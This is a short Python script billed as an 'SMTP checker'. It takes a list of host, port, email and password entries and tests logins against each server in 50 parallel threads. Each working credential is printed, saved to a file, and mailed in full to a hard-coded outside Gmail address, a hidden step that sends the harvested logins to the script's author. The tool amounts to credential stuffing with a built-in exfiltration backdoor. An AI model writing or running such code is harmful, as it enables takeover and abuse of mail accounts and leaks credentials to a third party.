import datetime
import concurrent.futures
import smtplib
from colorama import init
init(autoreset=True)
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn, k,g = '\033[00;36m', '\033[90m','\033[38;5;130m'

from os import system as SY
if __import__("platform").system == "Windows":
	SY("cls")
else:
	SY("clear")

print(f"""{k}
  __   __ __   _____   ___  
/' _/ |  V  | |_   _| | _,\ 
`._`. | \_/ |   | |   | v_/ 
|___/ |_| |_|   |_|   |_|   
  ___  _  _   ___    ___  _  __  ___   ___  
 / _/ | || | | __|  / _/ | |/ / | __| | _ \ 
| \__ | >< | | _|  | \__ |   <  | _|  | v / 
 \__/ |_||_| |___|  \__/ |_|\_\ |___| |_|_\ 

                                                   
    {pe}SMPT CHECKER {cn}@esfelurm
    
 {yw}   Format SmtpList : HOST|PORT|EMAIL|PASSWORD
""")

smtpS = input(f"{lrd}[{lgn}~{lrd}] {gn}Enter your smtp list : {cn}")
with open(smtpS, 'r') as f:
    smtps = [line.strip() for line in f.readlines()]

email = 'amir.esfelurm@gmail.com'

def check_smtp(smtp):
    global email
    domain, port, username, password = smtp.split('|')
    
    try:
        with smtplib.SMTP(domain, port, timeout=10) as smtp_server:
            smtp_server.starttls()
            smtp_server.login(username, password)

            message = f"SMTP used: {smtp}\n"

            smtp_server.sendmail(username, email, message)

            success_msg = f"Message sent successfully using {smtp}"
            sm = smtp.split('|')
            now = datetime.datetime.now()
            print(f"{cn}----------------------------\n{lrd}[{lgn}{now.hour}:{now.minute}:{now.second}{lrd}] {gn}SUCCESS!  \n{k}Email : {lgn}{sm[2]}\n{k}Password : {lgn}{sm[3]}\n{cn}----------------------------\n")
            with open('success.txt', 'a') as p:
                p.write(smtp + '\n')
    except Exception:
        print(f"{rd}----------------------------\n{lrd}[{yw}-{lrd}] {lrd}FAILED!  \n{rd}----------------------------\n")

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(check_smtp, smtps)
